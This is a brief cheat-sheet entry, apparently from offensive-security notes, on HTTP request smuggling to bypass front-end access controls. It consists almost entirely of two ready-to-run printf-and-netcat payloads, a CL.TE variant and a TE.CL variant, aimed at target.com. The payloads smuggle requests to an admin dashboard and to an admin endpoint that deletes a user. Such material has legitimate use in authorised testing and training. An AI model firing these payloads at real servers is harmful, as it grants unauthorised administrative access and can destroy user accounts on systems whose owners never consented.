
### CL.TE Smuggling for Access Control Bypass

```bash
# HTTP Request Smuggling to bypass front-end access control
# Front-end (proxy) uses Content-Length, back-end uses Transfer-Encoding
# This smuggles an admin request past the front-end ACL check

printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/dashboard HTTP/1.1\r\nHost: target.com\r\nCookie: session=USER_TOKEN\r\nContent-Length: 0\r\n\r\n' | nc target.com 80

# TE.CL variant smuggling for access control bypass
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /admin/delete_user?id=1 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=USER_TOKEN\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | nc target.com 80
```
